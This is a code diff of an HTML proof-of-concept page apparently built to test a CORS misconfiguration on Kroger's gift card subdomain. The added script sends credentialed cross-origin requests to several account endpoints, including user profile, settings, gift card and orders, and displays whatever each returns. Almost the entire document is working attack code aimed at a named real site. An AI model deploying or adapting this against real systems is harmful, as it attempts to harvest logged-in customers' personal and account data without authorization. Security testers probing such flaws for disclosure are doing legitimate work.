@@ -4,22 +4,30 @@
     <title>CORS PoC - giftcards.kroger.com</title>
   </head>
   <body>
-    <h2>CORS Exploit Test: giftcards.kroger.com</h2>
-    <p>Fetching sensitive data from Kroger gift cards subdomain...</p>
-    <pre id="output">Waiting for response...</pre>
-
+    <h1>Fetching sensitive data from Kroger gift cards subdomain...</h1>
     <script>
-      fetch("https://giftcards.kroger.com/robots.txt", {
-        method: "GET",
-        credentials: "include"
-      })
-      .then(res => res.text())
-      .then(data => {
-        document.getElementById("output").innerText = "Leaked Data:\n" + data;
-      })
-      .catch(err => {
-        document.getElementById("output").innerText = "Request failed or blocked.";
-        console.error(err);
+      const endpoints = [
+        "/api/user/profile",
+        "/mySettings",
+        "/account",
+        "/dashboard",
+        "/user/info",
+        "/giftCard",
+        "/orders"
+      ];
+
+      endpoints.forEach(endpoint => {
+        fetch("https://giftcards.kroger.com" + endpoint, {
+          credentials: "include"
+        })
+        .then(res => res.text())
+        .then(data => {
+          document.body.innerHTML += `<h3>Endpoint: ${endpoint}</h3><pre>${data}</pre>`;
+        })
+        .catch(err => {
+          document.body.innerHTML += `<h3 style="color:red;">${endpoint} failed</h3>`;
+          console.error(err);
+        });
       });
     </script>
   </body>
